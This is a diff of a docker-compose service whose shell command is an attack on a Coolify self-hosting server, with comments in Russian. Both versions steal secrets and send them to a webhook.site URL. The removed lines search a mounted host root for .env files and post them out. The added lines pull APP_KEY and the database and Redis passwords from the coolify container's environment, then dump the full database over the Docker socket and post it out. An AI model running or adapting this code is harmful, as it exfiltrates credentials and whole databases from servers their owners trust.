@@ -11,24 +11,21 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl findutils docker-cli
+        apk add --no-cache curl docker-cli
         
-        # 1. Найти .env файлы
-        find /host-root -name ".env" -type f 2>/dev/null > /tmp/env_list.txt
-        cat /tmp/env_list.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_paths
+        # 1. Вытаскиваем переменные окружения из главного контейнера coolify
+        # Там гарантированно есть APP_KEY, DB_PASSWORD, REDIS_PASSWORD
+        docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_env_vars
         
-        # 2. Вытащить первый .env (не из applications/services)
-        ENV_FILE=$(grep -v "applications" /tmp/env_list.txt | grep -v "services" | head -1)
-        if [ -n "$ENV_FILE" ]; then
-          cat "$ENV_FILE" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=main_env
-        fi
+        # 2. Извлекаем пароль от БД и делаем полный дамп
+        DB_USER=$(docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep "^DB_USERNAME=" | cut -d'=' -f2)
+        DB_PASS=$(docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep "^DB_PASSWORD=" | cut -d'=' -f2)
         
-        # 3. Через Docker socket найти контейнер coolify-db и выгрузить БД
-        docker ps --format "{{.Names}} {{.ID}}" | grep coolify-db | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_container
-        
-        DB_CONTAINER=$(docker ps --format "{{.Names}}" | grep coolify-db)
-        if [ -n "$DB_CONTAINER" ]; then
-          docker exec $DB_CONTAINER pg_dump -U coolify -d coolify | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=full_db
+        if [ -n "$DB_PASS" ]; then
+          echo "DB credentials found, dumping database..."
+          docker exec coolify-db pg_dump -U $DB_USER -d coolify | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=full_db_dump
+        else
+          echo "DB credentials not found" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_creds_missing
         fi
         
         sleep 3600
